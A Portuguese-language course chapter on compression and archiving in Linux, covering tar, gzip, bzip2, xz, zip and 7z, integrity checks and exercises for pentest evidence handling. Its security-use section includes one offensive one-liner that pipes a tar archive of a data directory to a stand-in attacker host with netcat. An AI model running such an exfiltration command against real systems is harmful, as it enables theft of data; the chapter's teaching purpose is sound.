# Capítulo 9 — Compactação e Arquivamento

## Objetivos do capítulo
- Utilizar `tar` para criar e extrair arquivos compactados.
- Conhecer formatos (`gzip`, `bzip2`, `xz`, `zip`) e quando aplicá-los.
- Preparar evidências e artefatos de pentest para transporte seguro.

## Ferramentas principais
| Formato | Comandos | Características |
| --- | --- | --- |
| `tar` | `tar -cf`, `tar -xf` | Agrupa arquivos sem compressão por padrão. |
| `tar.gz` | `tar -czf`, `tar -xzf` | Combina `tar` + `gzip` (rápido). |
| `tar.bz2` | `tar -cjf`, `tar -xjf` | Compressão melhor, mais lento. |
| `tar.xz` | `tar -cJf`, `tar -xJf` | Alta taxa de compressão, útil para grandes datasets. |
| `zip` | `zip`, `unzip` | Compatível com Windows. |
| `7z` | `7z a`, `7z x` | Suporte a múltiplos formatos, compressão forte. |

### Exemplos práticos
```bash
tar -czf relatorio.tar.gz relatorio.md evidencias/
7z a resultados.7z *.pcap -pSenhaForte -mhe
```

### Verificação de integridade
- `tar -tzf arquivo.tar.gz` — lista conteúdo sem extrair.
- `sha256sum arquivo.tar.gz` — gerar hash para garantir autenticidade.
- `gpg --detach-sign` — assinar arquivos críticos.

## Uso em operações de segurança
- **Ofensivo**: exfiltrar dados discretamente (`tar -czf - /dados | nc atacante 9000`).
- **Defensivo**: empacotar evidências forenses com hashes e armazenar em mídia WORM.

## Exercícios propostos
1. Montar script que gera backup diário de `/etc` com compressão `xz` e expira arquivos antigos.
2. Criar pipeline que compacta capturas `pcap` e transfere para servidor remoto com `scp`.
3. Testar diferentes níveis de compressão (`gzip -1` a `gzip -9`) e comparar tamanho/tempo.

## Referências adicionais
- `docs/04-filesystems-permissoes-e-criptografia.md` (seção de backup e integridade).
- `logs/` pode armazenar hashes e metadados de compressões realizadas.
